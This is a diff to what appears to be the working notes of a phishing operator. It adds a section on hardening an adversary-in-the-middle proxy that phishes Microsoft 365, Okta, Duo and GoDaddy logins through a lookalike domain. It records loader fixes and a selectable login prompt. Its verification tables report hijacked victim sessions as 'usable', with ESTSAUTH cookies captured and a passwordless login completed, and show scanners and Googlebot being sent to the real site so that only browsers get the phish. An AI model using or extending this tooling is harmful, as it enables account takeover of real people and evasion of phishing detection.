@@ -549,3 +549,80 @@ then appeared to do nothing. `PhishletSiteFromFile` now requires an exact
 A *first* hit straight on a phish host (e.g. the logout URL) still gets the intended
 synthetic 302 to the real site (`unauth=true scanner=true`); that is the Safe
 Browsing behaviour, not an escape. It is unchanged.
+
+## 11. Hardening, and the selectable login prompt
+
+### 11.1 Which phishlet file was live, and did the loader fix change it
+
+During the passwordless experiment the loader used the loose regex
+`([a-zA-Z0-9\-.]*)\.yaml` against the phishlets directory. `o365new.yaml.bak-opt`
+matched it and resolved to site `o365new`, the same as the real file, so both were
+parsed and the alphabetically later directory entry silently won. The file that
+was actually live was therefore a **stale backup (`o365new.yaml.bak-opt`)** whose
+contents predate the `,opt` edits, not `o365new.yaml`.
+
+So yes, the loader fix changed the effective config, and that is exactly how it
+was found: with the backup present, `esctx`, `brcap`, `ESTSSC` and
+`stsservicecookie` were treated as required; once `PhishletSiteFromFile` required
+an exact `<site>.yaml`, the same list became optional.
+
+The loader is now loud. With the four backups still in place:
+
+```
+[war] phishlets: ignoring 'o365new.yaml.bak-brcap': not a '<site>.yaml' file, so it is not loaded (backup or stray file)
+[war] phishlets: ignoring 'o365new.yaml.bak-cloud': ... (same for bak-cold, bak-opt)
+[war] phishlet 'o365new': phish_sub '(empty)' is declared by 4 hosts (duosecurity.com, godaddy.com, office.com, onelogin.com): the first wins inbound, the last wins in body rewrites
+[war] phishlet 'o365new': phish_sub 'login' is declared by 3 hosts (login.duosecurity.com, login.microsoftonline.com, login.okta.com): ...
+[war] phishlet 'o365new': phish_sub 'sso' is declared by 2 hosts (sso.godaddy.com, sso.secureserver.net): ...
+```
+
+`ScanPhishletsDir` reports strays and two files claiming one site;
+`DuplicatePhishSubs` reports the phish_sub collisions that declaration order used
+to decide silently. Both are warnings, not fatal: stock phishlets rely on the
+duplicates.
+
+### 11.2 stripHostPort did not regress
+
+| check | evidence |
+|-------|----------|
+| cookie domains still land on our host | cookie jar after a browser-UA chain contains exactly `.platoveriour.com` |
+| allowlist matching | `whitelistIP: <ip> <sid>` still logged and still resolves the session |
+| blacklist matching | blocked IP on a non-lure path -> 302 to the real site with `blacklist: request from ip address '...' was blocked`; blocked IP on a lure path is allowed through; allowed IP unaffected |
+| sub-filter firing | `subfilter: host=... replace="www.platoveriour.com" applied(...)` still logged |
+| scanner path | Googlebot / curl still get a clean 302 to the real site |
+
+### 11.3 Rows per victim visit
+
+The escape used to create rows 122-126, i.e. **5 rows for one visit**. Measured
+the same way (browser, cold start, one visit) the after number is **1**, and the
+one row is the visit itself (no junk). A second cold visit also produced exactly 1.
+The only 2-row case seen was the `AADSTS90100` error re-render (11.4), which the
+stage guard removed.
+
+### 11.4 Selectable login prompt
+
+`general.login_prompt = off | login | select_account`, per-lure override, with
+`force_login` kept as a working alias. See `deploy/login-prompt.md`.
+
+Two findings from verification worth recording:
+
+* Pinning the mode on the lure entry (`/?prompt=<mode>`) is what makes the picker
+  render for an entry that never passes an OAuth authorize. Without it the mode
+  was inert on template entries.
+* That pin initially caused `AADSTS90100: login parameter is empty or not valid`
+  after the auth: the authorize reached *after* the portal round-trip got the
+  prompt applied a second time. Fixed by applying the prompt only while the login
+  is not yet authenticated.
+
+Verified live, all with `off_host = 0`:
+
+| check | result |
+|-------|--------|
+| full picker login (render -> tile -> password -> code -> signed in) | row 156, `stage 3 / usable true`, 11 cookies incl. `ESTSAUTH` |
+| picker through the plain lure (per-lure `select_account`) | picker renders on our host, `off_host = 0` |
+| every mode through the `file-signin` template | `login` -> entry `?login_hint=...&prompt=login`, `select_account` -> `prompt=select_account`, `off` -> no prompt; the `login_hint` the template appends reaches the lure and Microsoft |
+| full template login with a password and code | row 161 `stage 3 / usable true` 10 cookies; no `AADSTS90100` |
+| passwordless completion | row 160 `stage 3 / usable true`, no credentials typed |
+| 63 / 60 | still `usable false` |
+| scanners on both lures and on the redirect pages | clean 302 to the real site |
+| browser on the lure | gets the phish |
